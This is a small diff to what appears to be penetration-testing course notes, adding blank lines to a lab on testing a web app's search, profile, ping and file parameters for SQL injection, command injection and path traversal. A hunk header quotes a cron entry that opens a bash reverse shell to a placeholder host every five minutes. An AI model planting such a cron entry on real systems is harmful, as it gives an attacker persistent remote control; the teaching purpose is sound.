@@ -417,6 +417,7 @@ echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/YOUR_IP/6666 0>&1'" | \
 ## Lab: Injection Testing Practice
 
 **Scenario**: You found a web application with:
+
 - A search page (`?q=`)
 - A user profile page (`?user_id=`)
 - A ping utility (`?ip=`)
@@ -427,6 +428,7 @@ echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/YOUR_IP/6666 0>&1'" | \
 ## Lab: Injection Testing Practice (cont.)
 
 Test each entry point systematically:
+
 1. SQL injection on `q` and `user_id`
 1. Command injection on `ip`
 1. Path traversal on `file`
